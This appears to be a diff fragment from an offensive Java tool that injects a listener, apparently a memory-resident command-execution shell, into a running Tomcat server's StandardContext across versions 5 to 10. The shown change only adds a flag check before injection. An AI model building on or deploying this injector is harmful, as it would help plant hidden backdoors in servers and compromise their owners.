@@ -9,7 +9,7 @@ import java.util.*;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * 5-10 全版本
  */
 public class TomcatExecThreadListener implements InvocationHandler {
@@ -41,7 +41,7 @@ public class TomcatExecThreadListener implements InvocationHandler {
 
             // 获取 standardContext
             Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
-            if (!isInject(standardContext, object)) {
+            if (!flag && !isInject(standardContext, object)) {
                 inject(standardContext, object);
             }
 
